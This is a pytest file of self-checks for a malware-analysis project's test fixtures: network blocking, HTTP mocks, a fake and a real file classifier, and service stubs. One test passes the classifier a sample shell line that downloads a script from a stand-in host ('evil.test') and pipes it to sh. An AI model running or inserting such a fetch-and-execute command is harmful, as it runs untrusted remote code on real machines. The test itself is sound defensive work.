"""Self-tests of the test infrastructure (fixtures, fakes, guards)."""

import socket
import time

import pytest
import requests

from common import content_store, file_classifier, hybrid_analysis
from tests.factories import insert_content


@pytest.mark.filterwarnings("ignore:A test tried to use socket")
def test_external_network_is_blocked():
    with pytest.raises(Exception, match="(?i)blocked|socket"):
        socket.create_connection(("192.0.2.1", 80), timeout=1)


def test_http_mock_intercepts_requests(http_mock):
    http_mock.get("https://api.example.test/x", json={"ok": True})
    assert requests.get("https://api.example.test/x").json() == {"ok": True}


def test_http_mock_rejects_unregistered_url(http_mock):
    with pytest.raises(requests.exceptions.ConnectionError):
        requests.get("https://unregistered.example.test/")


def test_local_http_server_passes_through_http_mock(http_mock, httpserver):
    httpserver.expect_request("/a.sh").respond_with_data(b"#!/bin/sh\n", content_type="application/x-sh")
    r = requests.get(httpserver.url_for("/a.sh"), timeout=5)
    assert r.content == b"#!/bin/sh\n"


def test_sleep_is_recorded(no_sleep):
    time.sleep(30)
    assert no_sleep == [30]


def test_fake_magika_used_by_default(db, content_dir, fake_magika):
    data = b"\x7fELF\x02\x01\x01" + b"\x00" * 64
    content_id = insert_content(db, data, content_dir=content_dir)
    result = content_store.classify_content(db, content_id, data=data)
    assert result["label"] == "elf" and result["category"] == "executable"
    assert fake_magika.calls == [("bytes", data)]


@pytest.mark.slow
def test_real_magika(real_magika):
    result = file_classifier.classify_bytes(b"#!/bin/sh\nwget http://evil.test/a.sh -O- | sh\n")
    assert result["category"] == "script"
    assert result["model"] != "fake_magika"


def test_hybrid_analysis_state_is_reset():
    assert hybrid_analysis.paused_until() is None
    assert hybrid_analysis.request_stats()["requests"] == 0


def test_warden_stub_is_importable(warden_events):
    import warden_client
    warden_events([{"ID": "1"}])
    client = warden_client.Client()
    assert client.getEvents() == [{"ID": "1"}]
    assert client.getEvents() == []


def test_web_app_lists_empty_db(web_client):
    r = web_client.get("/")
    assert r.status_code == 200
